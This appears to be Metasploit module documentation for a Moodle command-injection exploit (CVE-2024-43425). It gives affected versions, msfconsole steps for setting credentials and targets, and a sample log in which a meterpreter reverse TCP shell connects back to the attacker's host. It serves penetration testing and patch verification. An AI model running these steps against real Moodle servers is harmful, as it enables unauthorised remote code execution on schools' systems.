## Vulnerable Application

This module exploits a command injection vulnerability in Moodle (CVE-2024-43425) to obtain remote code execution.
By default, the application will run in the context of www-data, so only a limited shell can be obtained.

Valid credentials are required to exploit this vulnerability. Moreover, the user must be authorized to either add a new or modify an
existing quiz, in order to reach the vulnerable function and trigger the bug. User roles that fall into this category include
`Teacher` and `Administrator`, but might differ depending on the specific deployment and configuration.

Affected versions include:
* 4.4 to 4.4.1
* 4.3 to 4.3.5
* 4.2 to 4.2.8
* 4.1 to 4.1.11

Moodle published an advisory [here](https://moodle.org/mod/forum/discuss.php?d=461193).

The original advisory is available [here](https://www.redteam-pentesting.de/en/advisories/rt-sa-2024-009/), and a more detailed writeup is
available [here](https://blog.redteam-pentesting.de/2024/moodle-rce/).

## Testing

Legacy releases from Moodle can be obtained from [here](https://download.moodle.org/releases/legacy/).
An installation guide is available [here](https://docs.moodle.org/404/en/Step-by-step_Installation_Guide_for_Ubuntu).

**Successfully tested on**

- Moodle v4.4.1 on Ubuntu 20.04 LTS

## Verification Steps

1. Deploy Moodle
2. Start `msfconsole`
3. `use exploit/linux/http/moodle_rce`
4. `set USERNAME <USER>`
5. `set PASSWORD <PASSWORD>`
6. `set CMID <ID>`
7. `set COURSEID <ID>`
8. `set RHOSTS <IP>`
9. `set LHOST <IP>`
10. `exploit`

## Options

### USERNAME
The username to authenticate with in Moodle.

### PASSWORD
The password for the user.

### CMID
The course module ID. Can be retrieved from the URL when the "Add question" button is pressed within a quiz of a course
(e.g., IP>/moodle/mod/quiz/edit.php?cmid=4).

### COURSEID
The course ID. Can be retrieved from the URL when the course is selected (e.g., <IP>/moodle/course/view.php?id=3).

## Scenarios

Running the module against Moodle v4.4.1 should result in an output similar to the following:

```
msf6 > use exploit/linux/http/moodle_rce 
[*] No payload configured, defaulting to cmd/linux/http/x64/meterpreter/reverse_tcp
msf6 exploit(linux/http/moodle_rce) > set USERNAME testuser
USERNAME => testuser
msf6 exploit(linux/http/moodle_rce) > set PASSWORD iusldbf843498fKJASD
PASSWORD => iusldbf843498fKJASD
msf6 exploit(linux/http/moodle_rce) > set CMID 2
CMID => 2
msf6 exploit(linux/http/moodle_rce) > set COURSEID 2
COURSEID => 2
msf6 exploit(linux/http/moodle_rce) > set RHOSTS 192.168.217.141
RHOSTS => 192.168.217.141
msf6 exploit(linux/http/moodle_rce) > set LHOST 192.168.217.128
LHOST => 192.168.217.128
msf6 auxiliary(exploit/linux/http/moodle_rce) > exploit 
[*] Started reverse TCP handler on 192.168.217.128:4444 
[*] Obtaining MoodleSession and logintoken...
[+] Server reachable.
[*] Authenticating as testuser...
[*] Successfully authenticated.
[*] Obtaining sesskey, courseContextId, and category...
[*] Injecting command...
[*] Sending stage (3045380 bytes) to 192.168.217.141
[*] Meterpreter session 1 opened (192.168.217.128:4444 -> 192.168.217.141:37152) at 2024-09-01 18:19:44 -0400
[-] Exploit aborted due to failure: unreachable: Failed to receive a reply from the server.
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/moodle_rce) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo 
Computer     : 192.168.217.141
OS           : Ubuntu 24.04 (Linux 6.8.0-41-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
  
meterpreter > getuid 
Server username: www-data
```
